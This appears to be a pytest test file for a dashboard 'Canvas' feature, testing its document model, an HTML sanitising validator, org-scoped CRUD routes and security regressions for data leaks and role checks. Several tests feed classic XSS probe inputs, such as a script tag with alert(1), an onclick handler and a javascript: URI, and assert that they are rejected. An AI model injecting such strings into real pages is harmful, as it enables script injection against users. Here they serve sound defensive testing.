"""Tests for Canvas Wave 1: model, validation, CRUD, and collect_canvas_data.

Coverage
--------
1. CanvasDoc model round-trip
   a. Minimal doc (no bindings, no variables).
   b. Full doc (query + metric + api bindings, variables, assets).
   c. Discriminated binding coercion (kind dispatch).

2. validate_canvas_doc — HTML safety
   a. Rejects <script> tags.
   b. Rejects on*= inline event handlers.
   c. Rejects javascript: URI.
   d. Rejects unknown custom elements.
   e. Accepts all canonical nubi-* elements.
   f. Clean HTML → (True, []).

3. validate_canvas_doc — binding checks
   a. Orphan binding (el_id not in HTML) → [warn].
   b. Unbound element (data-el-id not in bindings) → [warn].
   c. At-most-one binding per element (model enforces this via dict keying).
   d. Unknown query_id → [warn].
   e. Valid doc with matching el_ids → no hard errors.

4. canvases CRUD (via routes + InMemoryRepo)
   a. POST /canvases → 201.
   b. GET /canvases → includes created canvas.
   c. GET /canvases/{id} → 200.
   d. PUT /canvases/{id} → updated fields reflected.
   e. DELETE /canvases/{id} → 204, then GET → 404.
   f. No token → 401.
   g. Cross-org: another user cannot GET/PUT/DELETE the canvas.

5. POST /canvas/validate — stateless oracle
   a. 401 without auth.
   b. Valid doc → 200, valid=True, no errors.
   c. Doc with <script> → valid=False, errors contain the issue.
   d. Doc with orphan binding → valid=True, warnings contain the issue.

6. collect_canvas_data
   a. Missing canvas → AppError("canvas_not_found").
   b. Query binding → runs run_query_rows, returns {el_id: {columns, rows}}.
   c. RLS / org-scoping: canvas from different org → canvas_not_found.
   d. Best-effort: unknown query_id → entry has "error" key, others succeed.
"""

from __future__ import annotations

import uuid
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from app.auth.jwt import mint_access_token
from app.dashboards.canvas import (
    ApiBinding,
    CanvasDoc,
    CanvasVariable,
    MetricBinding,
    QueryBinding,
    validate_canvas_doc,
)
from app.errors import AppError
from app.repos.memory import InMemoryRepo
from app.repos.provider import set_repo


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _auth_headers(user_id: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {mint_access_token(user_id)}"}


def _make_user(user_id: str) -> dict[str, Any]:
    return {
        "id": user_id,
        "email": "canvas-tester@example.com",
        "name": "Canvas Tester",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }


def _good_doc_dict() -> dict[str, Any]:
    """Return a valid CanvasDoc dict with one query binding."""
    return {
        "version": 1,
        "title": "Test Canvas",
        "html": '<div><nubi-kpi data-el-id="el_1"></nubi-kpi></div>',
        "bindings": {
            "el_1": {"kind": "query", "query_id": "demo_all", "field": "id"},
        },
        "variables": [{"name": "region", "type": "select", "default": "US"}],
        "assets": {"css": ".canvas { color: red; }"},
    }


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest_asyncio.fixture
async def canvas_client(app, fake_db):
    """HTTPX async client with InMemoryRepo + seeded user + org."""
    repo = InMemoryRepo()
    set_repo(repo)

    user_id = str(uuid.uuid4())
    org_id = str(uuid.uuid4())
    fake_db.users[user_id] = _make_user(user_id)
    repo.seed_org_member(org_id=org_id, user_id=user_id)

    transport = ASGITransport(app=app)
    async with AsyncClient(
        transport=transport,
        base_url="http://testserver",
        follow_redirects=False,
    ) as ac:
        yield ac, user_id, org_id, repo

    set_repo(None)


# ---------------------------------------------------------------------------
# 1. CanvasDoc model round-trip
# ---------------------------------------------------------------------------


class TestCanvasDocModel:
    """CanvasDoc Pydantic model round-trip and binding coercion."""

    def test_minimal_doc_parses(self):
        doc = CanvasDoc.model_validate({"version": 1, "title": "Empty", "html": "<p></p>"})
        assert doc.version == 1
        assert doc.title == "Empty"
        assert doc.bindings == {}
        assert doc.variables == []

    def test_defaults_populated(self):
        doc = CanvasDoc.model_validate({})
        assert doc.version == 1
        assert doc.html == ""
        assert doc.bindings == {}
        assert doc.assets == {}
        assert doc.variables == []

    def test_query_binding_coerced(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        assert "el_1" in doc.bindings
        b = doc.bindings["el_1"]
        assert isinstance(b, QueryBinding)
        assert b.query_id == "demo_all"
        assert b.field == "id"

    def test_metric_binding_coerced(self):
        data = {
            "html": '<nubi-metric data-el-id="m1"></nubi-metric>',
            "bindings": {
                "m1": {"kind": "metric", "metric_id": "rev_total", "time_grain": "month"},
            },
        }
        doc = CanvasDoc.model_validate(data)
        b = doc.bindings["m1"]
        assert isinstance(b, MetricBinding)
        assert b.metric_id == "rev_total"
        assert b.time_grain == "month"

    def test_api_binding_coerced(self):
        data = {
            "html": '<nubi-value data-el-id="a1"></nubi-value>',
            "bindings": {
                "a1": {
                    "kind": "api",
                    "connector_id": "some-connector-uuid",
                    "path": "/v1/data",
                    "select": "$.value",
                },
            },
        }
        doc = CanvasDoc.model_validate(data)
        b = doc.bindings["a1"]
        assert isinstance(b, ApiBinding)
        assert b.connector_id == "some-connector-uuid"
        assert b.path == "/v1/data"
        assert b.select == "$.value"

    def test_model_dump_round_trips(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        dumped = doc.model_dump()
        doc2 = CanvasDoc.model_validate(dumped)
        assert doc.title == doc2.title
        assert set(doc.bindings.keys()) == set(doc2.bindings.keys())

    def test_variables_parsed(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        assert len(doc.variables) == 1
        v = doc.variables[0]
        assert isinstance(v, CanvasVariable)
        assert v.name == "region"
        assert v.type == "select"
        assert v.default == "US"

    def test_full_doc_parses(self):
        data = {
            "version": 1,
            "title": "Full Canvas",
            "html": (
                '<section>'
                '<nubi-kpi data-el-id="k1"></nubi-kpi>'
                '<nubi-table data-el-id="t1"></nubi-table>'
                '<nubi-value data-el-id="v1"></nubi-value>'
                '</section>'
            ),
            "bindings": {
                "k1": {"kind": "query", "query_id": "demo_all"},
                "t1": {"kind": "query", "query_id": "demo_all"},
                "v1": {"kind": "api", "connector_id": "c1", "path": "/"},
            },
            "variables": [{"name": "period", "type": "date", "default": None}],
            "assets": {"css": "body { margin: 0; }"},
            "theme": {"accent": "#0af"},
        }
        doc = CanvasDoc.model_validate(data)
        assert len(doc.bindings) == 3
        assert isinstance(doc.bindings["k1"], QueryBinding)
        assert isinstance(doc.bindings["v1"], ApiBinding)
        assert doc.theme == {"accent": "#0af"}


# ---------------------------------------------------------------------------
# 2. validate_canvas_doc — HTML safety
# ---------------------------------------------------------------------------


class TestValidateCanvasDocHtmlSafety:
    """validate_canvas_doc rejects forbidden HTML constructs."""

    def test_rejects_script_tag(self):
        doc = CanvasDoc.model_validate(
            {"html": '<div><script>alert(1)</script></div>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("script" in i.lower() for i in issues), issues

    def test_rejects_on_handler(self):
        doc = CanvasDoc.model_validate(
            {"html": '<button onclick="alert(1)">click</button>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("on*=" in i or "inline event handler" in i.lower() for i in issues), issues

    def test_rejects_javascript_uri(self):
        doc = CanvasDoc.model_validate(
            {"html": '<a href="javascript:void(0)">link</a>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("javascript:" in i for i in issues), issues

    def test_rejects_unknown_custom_element(self):
        doc = CanvasDoc.model_validate(
            {"html": '<x-unknown-element></x-unknown-element>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("unknown custom element" in i.lower() for i in issues), issues

    def test_accepts_all_canonical_nubi_elements(self):
        html = (
            '<div>'
            '<nubi-kpi data-el-id="e1"></nubi-kpi>'
            '<nubi-table data-el-id="e2"></nubi-table>'
            '<nubi-chart data-el-id="e3"></nubi-chart>'
            '<nubi-metric data-el-id="e4"></nubi-metric>'
            '<nubi-filter data-el-id="e5"></nubi-filter>'
            '<nubi-text data-el-id="e6"></nubi-text>'
            '<nubi-value data-el-id="e7"></nubi-value>'
            '</div>'
        )
        doc = CanvasDoc.model_validate({"html": html, "bindings": {}})
        ok, issues = validate_canvas_doc(doc)
        hard_issues = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard_issues == [], f"Unexpected hard issues: {hard_issues}"

    def test_clean_html_returns_true_no_hard_errors(self):
        doc = CanvasDoc.model_validate(
            {"html": "<div><p>Hello world</p></div>", "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Expected no hard errors, got: {hard}"


# ---------------------------------------------------------------------------
# 3. validate_canvas_doc — binding checks
# ---------------------------------------------------------------------------


class TestValidateCanvasDocBindings:
    """validate_canvas_doc checks binding ↔ HTML element consistency."""

    def test_orphan_binding_is_warning(self):
        """Binding with el_id absent from HTML → [warn], not hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",  # no data-el-id
                "bindings": {
                    "orphan_el": {"kind": "query", "query_id": "demo_all"},
                },
            }
        )
        ok, issues = validate_canvas_doc(doc)
        # Hard errors only for the orphan? No — the orphan is a [warn].
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Orphan binding should only warn, got hard: {hard}"
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("orphan_el" in i for i in warns), warns

    def test_unbound_element_is_warning(self):
        """data-el-id in HTML with no binding → [warn]."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="unbound_kpi"></nubi-kpi>',
                "bindings": {},
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("unbound_kpi" in i for i in warns), warns

    def test_at_most_one_binding_per_el_is_trivially_enforced(self):
        """The bindings dict can only have one value per el_id (dict keys unique)."""
        # Pydantic models dict → only the last key wins for duplicate keys in JSON.
        # We verify that the model correctly stores only one binding per el_id.
        data = {
            "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
            "bindings": {"el_1": {"kind": "query", "query_id": "demo_all"}},
        }
        doc = CanvasDoc.model_validate(data)
        assert len(doc.bindings) == 1
        assert "el_1" in doc.bindings

    def test_unknown_query_id_is_warning(self):
        """Binding referencing a non-registered query_id → [warn]."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
                "bindings": {
                    "el_1": {"kind": "query", "query_id": "does_not_exist_xyz_12345"},
                },
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("does_not_exist_xyz_12345" in i for i in warns), warns

    def test_matching_el_ids_no_hard_errors(self):
        """Doc where all el_ids match bindings ↔ HTML → no hard errors."""
        doc = CanvasDoc.model_validate(_good_doc_dict())
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Expected no hard errors for good doc: {hard}"

    def test_multiple_bindings_with_some_orphans(self):
        """Multiple bindings: orphans warn, bound ones succeed."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="real_el"></nubi-kpi>',
                "bindings": {
                    "real_el": {"kind": "query", "query_id": "demo_all"},
                    "ghost_el": {"kind": "query", "query_id": "demo_all"},
                },
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("ghost_el" in i for i in warns), warns
        # real_el should not appear in any orphan warning
        assert not any("real_el" in i and "no matching" in i.lower() for i in warns)


# ---------------------------------------------------------------------------
# 4. canvases CRUD (via routes + InMemoryRepo)
# ---------------------------------------------------------------------------


class TestCanvasesCrud:
    """Happy-path CRUD tests for the /canvases routes."""

    @pytest.mark.asyncio
    async def test_create_returns_201(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvases",
            json={"name": "My Canvas", "config": {"doc": {"version": 1, "title": "X"}}},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 201, resp.text
        body = resp.json()
        assert body["name"] == "My Canvas"
        assert "id" in body
        assert body["org_id"] == org_id
        assert body["created_by"] == user_id

    @pytest.mark.asyncio
    async def test_list_shows_created_canvas(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Listed Canvas"},
            headers=_auth_headers(user_id),
        )
        assert create_resp.status_code == 201

        list_resp = await client.get(
            "/api/v1/canvases",
            headers=_auth_headers(user_id),
        )
        assert list_resp.status_code == 200
        canvases = list_resp.json()
        assert isinstance(canvases, list)
        names = [c["name"] for c in canvases]
        assert "Listed Canvas" in names

    @pytest.mark.asyncio
    async def test_get_returns_200(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Gettable Canvas"},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert get_resp.status_code == 200
        assert get_resp.json()["id"] == canvas_id
        assert get_resp.json()["name"] == "Gettable Canvas"

    @pytest.mark.asyncio
    async def test_update_reflects_change(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Old Name", "config": {"v": 1}},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        update_resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"name": "New Name", "config": {"v": 2}},
            headers=_auth_headers(user_id),
        )
        assert update_resp.status_code == 200
        updated = update_resp.json()
        assert updated["name"] == "New Name"
        assert updated["config"] == {"v": 2}

    @pytest.mark.asyncio
    async def test_delete_then_get_returns_404(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Deletable Canvas"},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        del_resp = await client.delete(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert del_resp.status_code == 204

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert get_resp.status_code == 404

    @pytest.mark.asyncio
    async def test_no_token_returns_401(self, canvas_client):
        client, _user_id, _org_id, _repo = canvas_client
        resp = await client.get("/api/v1/canvases")
        assert resp.status_code == 401

    @pytest.mark.asyncio
    async def test_cross_org_cannot_get(self, canvas_client, fake_db):
        """A user from a different org cannot GET another org's canvas."""
        client, alice_id, alice_org_id, repo = canvas_client

        # Create a canvas as Alice.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Alice's Canvas"},
            headers=_auth_headers(alice_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Create Bob in a different org.
        bob_id = str(uuid.uuid4())
        bob_org_id = str(uuid.uuid4())
        fake_db.users[bob_id] = _make_user(bob_id)
        repo.seed_org_member(org_id=bob_org_id, user_id=bob_id)

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(bob_id),
        )
        # Bob must get 404 (not 403 — no info leak).
        assert get_resp.status_code == 404


# ---------------------------------------------------------------------------
# 5. POST /canvas/validate — stateless oracle
# ---------------------------------------------------------------------------


class TestCanvasValidateEndpoint:
    """POST /canvas/validate endpoint behaviour."""

    @pytest.mark.asyncio
    async def test_requires_auth(self, canvas_client):
        client, _user_id, _org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": _good_doc_dict()},
        )
        assert resp.status_code == 401

    @pytest.mark.asyncio
    async def test_valid_doc_returns_valid_true(self, canvas_client):
        client, user_id, _org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": _good_doc_dict()},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        # Hard errors (non-warn issues) should be absent.
        assert body["errors"] == [], f"Expected no hard errors, got: {body['errors']}"

    @pytest.mark.asyncio
    async def test_script_tag_returns_invalid(self, canvas_client):
        client, user_id, _org_id, _repo = canvas_client
        bad_doc = {
            "version": 1,
            "title": "XSS",
            "html": "<script>alert(1)</script>",
            "bindings": {},
        }
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": bad_doc},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        assert body["valid"] is False
        assert len(body["errors"]) > 0
        assert any("script" in e.lower() for e in body["errors"])

    @pytest.mark.asyncio
    async def test_orphan_binding_in_warnings(self, canvas_client):
        """Orphan binding (el_id not in HTML) → valid=True, warning present."""
        client, user_id, _org_id, _repo = canvas_client
        doc_with_orphan = {
            "version": 1,
            "title": "Orphan Test",
            "html": "<div><p>No data-el-id here</p></div>",
            "bindings": {
                "orphan_id": {"kind": "query", "query_id": "demo_all"},
            },
        }
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": doc_with_orphan},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        assert body["valid"] is True, f"Orphan should only warn: {body['errors']}"
        assert len(body["warnings"]) > 0
        assert any("orphan_id" in w for w in body["warnings"])


# ---------------------------------------------------------------------------
# 6. collect_canvas_data
# ---------------------------------------------------------------------------


class TestCollectCanvasData:
    """collect_canvas_data: org-scoping, RLS, best-effort collection."""

    @pytest.mark.asyncio
    async def test_missing_canvas_raises(self):
        """Unknown canvas_id → AppError("canvas_not_found")."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())

        with pytest.raises(AppError) as exc_info:
            await collect_canvas_data(
                canvas_id=str(uuid.uuid4()),
                org_id=org_id,
                claims={},
                repo=repo,
            )
        assert exc_info.value.code == "canvas_not_found"

    @pytest.mark.asyncio
    async def test_cross_org_canvas_raises(self):
        """Canvas belonging to a different org → canvas_not_found."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_a = str(uuid.uuid4())
        org_b = str(uuid.uuid4())
        user_a = str(uuid.uuid4())
        user_b = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_a, user_id=user_a)
        repo.seed_org_member(org_id=org_b, user_id=user_b)

        # Create canvas in org_a.
        canvas = await repo.create(
            "canvases",
            org_id=org_a,
            created_by=user_a,
            name="Org A Canvas",
            config={"doc": {"version": 1, "html": "", "bindings": {}}},
        )
        canvas_id = canvas["id"]

        # org_b cannot access org_a's canvas.
        with pytest.raises(AppError) as exc_info:
            await collect_canvas_data(
                canvas_id=canvas_id,
                org_id=org_b,
                claims={},
                repo=repo,
            )
        assert exc_info.value.code == "canvas_not_found"

    @pytest.mark.asyncio
    async def test_query_binding_calls_run_query_rows(self):
        """Query binding → run_query_rows called; result returned under el_id."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Q Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
                    "bindings": {
                        "el_1": {"kind": "query", "query_id": "demo_all"},
                    },
                }
            },
        )

        # Patch run_query_rows so we don't need a live DuckDB session.
        mock_rows = (["id", "name"], [[1, "Alice"]])
        with patch(
            "app.dashboards.collect.run_query_rows",
            new=AsyncMock(return_value=mock_rows),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert "el_1" in result
        assert result["el_1"]["columns"] == ["id", "name"]
        assert result["el_1"]["rows"] == [[1, "Alice"]]

    @pytest.mark.asyncio
    async def test_unknown_query_id_returns_error_key(self):
        """Unknown query_id → entry has 'error' key, not a hard exception."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Bad Q Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-kpi data-el-id="el_bad"></nubi-kpi>',
                    "bindings": {
                        "el_bad": {"kind": "query", "query_id": "nonexistent_xyz_9999"},
                    },
                }
            },
        )

        result = await collect_canvas_data(
            canvas_id=canvas["id"],
            org_id=org_id,
            claims={},
            repo=repo,
        )

        assert "el_bad" in result
        assert "error" in result["el_bad"], f"Expected error key, got: {result['el_bad']}"

    @pytest.mark.asyncio
    async def test_empty_bindings_returns_empty_dict(self):
        """Canvas with no bindings → empty result dict."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Empty Canvas",
            config={"doc": {"version": 1, "html": "<p>hello</p>", "bindings": {}}},
        )

        result = await collect_canvas_data(
            canvas_id=canvas["id"],
            org_id=org_id,
            claims={},
            repo=repo,
        )
        assert result == {}

    @pytest.mark.asyncio
    async def test_prefetched_canvas_skips_repo_lookup(self):
        """Pre-fetching the canvas row avoids the repo.get call."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas_row = {
            "id": str(uuid.uuid4()),
            "org_id": org_id,
            "name": "Prefetched",
            "config": {"doc": {"version": 1, "html": "<div></div>", "bindings": {}}},
        }

        # Pass pre-fetched canvas; if repo.get were called it would return None
        # (canvas not in store) and raise — this verifies the bypass.
        result = await collect_canvas_data(
            canvas_id=canvas_row["id"],
            org_id=org_id,
            claims={},
            repo=repo,
            canvas=canvas_row,
        )
        assert result == {}


# ---------------------------------------------------------------------------
# 7. Security regression tests
# ---------------------------------------------------------------------------


@pytest_asyncio.fixture
async def canvas_client_with_viewer(app, fake_db):
    """HTTPX async client with a member user + a viewer user, both in separate orgs."""
    repo = InMemoryRepo()
    set_repo(repo)

    # Owner/member user
    owner_id = str(uuid.uuid4())
    owner_org_id = str(uuid.uuid4())
    fake_db.users[owner_id] = {
        "id": owner_id,
        "email": "owner@example.com",
        "name": "Owner",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }
    repo.seed_org_member(org_id=owner_org_id, user_id=owner_id, role="owner")

    # Viewer user in their own org
    viewer_id = str(uuid.uuid4())
    viewer_org_id = str(uuid.uuid4())
    fake_db.users[viewer_id] = {
        "id": viewer_id,
        "email": "viewer@example.com",
        "name": "Viewer",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }
    repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")

    transport = ASGITransport(app=app)
    async with AsyncClient(
        transport=transport,
        base_url="http://testserver",
        follow_redirects=False,
    ) as ac:
        yield ac, owner_id, owner_org_id, viewer_id, viewer_org_id, repo

    set_repo(None)


class TestCanvasSecurityRegressions:
    """Regression tests for the three confirmed security findings.

    Finding 1 (CRITICAL RLS): schedule endpoint must snapshot owner policies.
    Finding 2 (MED RBAC):     viewer is 403 on create/update/delete/schedule.
    Finding 3 (MED safety):   PUT rejects HTML with a <script> tag.
    """

    # ── Finding 1: Schedule snapshots owner policies ─────────────────────────

    @pytest.mark.asyncio
    async def test_schedule_snapshots_owner_policies_onto_flow_spec(
        self, canvas_client_with_viewer, fake_db
    ):
        """POST /canvases/{id}/schedule stores __owner_policies__ in flow spec.

        Regression for CRITICAL RLS finding: without this snapshot the scheduled
        report_send would render with claims=None → all tenant rows leak to
        recipients. The snapshot is read back from the flow store after creation.
        """
        from app.flows.store import get_flow_store
        from app.routes.flows import OWNER_POLICIES_KEY

        client, owner_id, _owner_org, *_ = canvas_client_with_viewer

        # Create a canvas first.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Scheduled Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        # Schedule the canvas.
        sched_resp = await client.post(
            f"/api/v1/canvases/{canvas_id}/schedule",
            json={"recipients": ["alice@example.com"], "format": "html"},
            headers=_auth_headers(owner_id),
        )
        assert sched_resp.status_code == 201, sched_resp.text
        flow_id = sched_resp.json()["flow_id"]

        # The persisted flow spec MUST have runtime_config[OWNER_POLICIES_KEY].
        store = get_flow_store()
        flow = await store.get_flow(flow_id)
        assert flow is not None, "Flow not found in store."
        spec = flow.get("spec") or {}
        runtime_config = spec.get("runtime_config") or {}
        assert OWNER_POLICIES_KEY in runtime_config, (
            f"__owner_policies__ missing from flow spec runtime_config. "
            f"spec keys: {list(spec.keys())}, runtime_config: {runtime_config}"
        )
        # The snapshot value must be a dict (even if empty for an unscoped owner).
        assert isinstance(runtime_config[OWNER_POLICIES_KEY], dict)

    # ── Finding 4 (MED): schedule sets top-level schedule + next_run_at ────────

    @pytest.mark.asyncio
    async def test_scheduled_canvas_flow_has_schedule_and_next_run_at(
        self, canvas_client_with_viewer, fake_db
    ):
        """POST /canvases/{id}/schedule with cron sets top-level schedule + next_run_at.

        Regression for MED functional bug: previously create_flow was called
        WITHOUT schedule= / next_run_at= kwargs so the cron lived only inside
        flow_spec['trigger']['cron'], but list_due_scheduled_flows checks the
        top-level flow.schedule / flow.next_run_at columns — meaning the
        scheduled report silently never fired (201 success, no send).
        """
        from app.flows.store import get_flow_store
        from datetime import datetime, timezone

        client, owner_id, _owner_org, *_ = canvas_client_with_viewer

        # Create a canvas.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Cron Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        cron_expr = "0 8 * * MON"

        # Schedule the canvas with a cron.
        sched_resp = await client.post(
            f"/api/v1/canvases/{canvas_id}/schedule",
            json={
                "recipients": ["bob@example.com"],
                "format": "html",
                "cron": cron_expr,
            },
            headers=_auth_headers(owner_id),
        )
        assert sched_resp.status_code == 201, sched_resp.text
        flow_id = sched_resp.json()["flow_id"]

        # Retrieve the flow from the store and check top-level schedule fields.
        store = get_flow_store()
        flow = await store.get_flow(flow_id)
        assert flow is not None, "Flow not found in store."

        # Top-level schedule must match the cron expression.
        assert flow.get("schedule") == cron_expr, (
            f"Expected top-level schedule={cron_expr!r}, got {flow.get('schedule')!r}"
        )

        # Top-level next_run_at must be a datetime in the future (not None).
        next_run_at = flow.get("next_run_at")
        assert next_run_at is not None, (
            "next_run_at must be set so list_due_scheduled_flows can discover this flow"
        )
        now = datetime.now(timezone.utc)
        if getattr(next_run_at, "tzinfo", None) is None:
            next_run_at = next_run_at.replace(tzinfo=timezone.utc)
        assert next_run_at > now, (
            f"next_run_at {next_run_at} should be in the future for a weekly cron"
        )

        # The flow must be enabled so the scheduler picks it up.
        assert flow.get("enabled") is True, (
            f"Scheduled canvas flow must be enabled, got enabled={flow.get('enabled')!r}"
        )

        # Verify list_due_scheduled_flows does NOT include it yet (future run time).
        due = await store.list_due_scheduled_flows(now)
        due_ids = [str(f["id"]) for f in due]
        assert flow_id not in due_ids, (
            "Flow should not be due yet — next_run_at is in the future"
        )

        # Backdate next_run_at in the store's internal dict so the flow is discoverable.
        # (get_flow returns a deepcopy, so we must mutate the canonical entry directly.)
        from datetime import timedelta
        past = now - timedelta(seconds=1)
        store._flows[flow_id]["next_run_at"] = past
        due_after_backdate = await store.list_due_scheduled_flows(now)
        due_ids_after = [str(f["id"]) for f in due_after_backdate]
        assert flow_id in due_ids_after, (
            "Flow should be discoverable by list_due_scheduled_flows once next_run_at is past"
        )

    # ── Finding 2: Viewer is 403 on all mutating endpoints ───────────────────

    @pytest.mark.asyncio
    async def test_viewer_cannot_create_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from POST /canvases."""
        client, _owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Viewer Canvas"},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_update_canvas(self, canvas_client_with_viewer, fake_db):
        """Viewer role is forbidden (403) from PUT /canvases/{id}."""
        client, owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Viewer cannot update (even their own org — viewer_org has no canvas here,
        # but the 403 fires before the 404 because the writer guard runs first).
        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"name": "Hijacked Name"},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_delete_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from DELETE /canvases/{id}."""
        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
